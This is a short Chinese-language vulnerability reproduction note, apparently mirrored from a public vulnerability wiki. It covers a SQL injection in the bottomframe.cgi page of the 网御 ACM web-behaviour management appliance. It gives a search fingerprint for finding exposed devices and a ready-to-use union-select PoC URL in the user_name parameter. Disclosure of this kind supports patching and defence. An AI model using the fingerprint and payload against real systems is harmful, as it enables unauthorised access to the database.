---
title: "网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞"
date: 2026-10-18 09:16:41
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "网御-ACM上网行为管理系统"
tags:
  - "网御-ACM上网行为管理系统"
  - "SQL注入"
  - "漏洞复现"
---
## 漏洞描述

网御 ACM上网行为管理系统 bottomframe.cgi 存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感信

## 漏洞影响

网御 ACM上网行为管理系统

## 网络测绘

```
"scripts/webcommon.js"
```

## 漏洞复现

登录页面

![image-20230828161622332](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828161622332.png)

验证POC

```
/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23
```

![image-20230828161702043](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828161702043.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BD%91%E5%BE%A1-ACM%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
